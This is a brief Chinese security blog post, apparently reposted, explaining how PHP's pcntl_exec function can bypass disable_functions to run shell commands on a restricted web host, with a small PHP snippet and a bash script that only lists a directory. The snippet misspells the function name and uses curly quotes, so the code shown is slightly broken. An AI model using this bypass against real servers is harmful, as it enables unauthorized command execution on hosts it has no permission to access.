title: 渗透技巧：利用pcntl_exec突破disable_functions
categories: [网络安全]
tags: []
date: 2013-04-19 08:30:15
---
1、说明
pcntl是linux下的一个扩展，可以支持php的多线程操作。
pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 >= 4.2.0, PHP 5
2、利用
在做渗透的时候被disable_functions卡住不能执行命令是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。
#exec.php
<?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>
#/tmp/b4dboy.sh
#!/bin/bash
ls -l /
原文：http://www.secoff.net/archives/116.html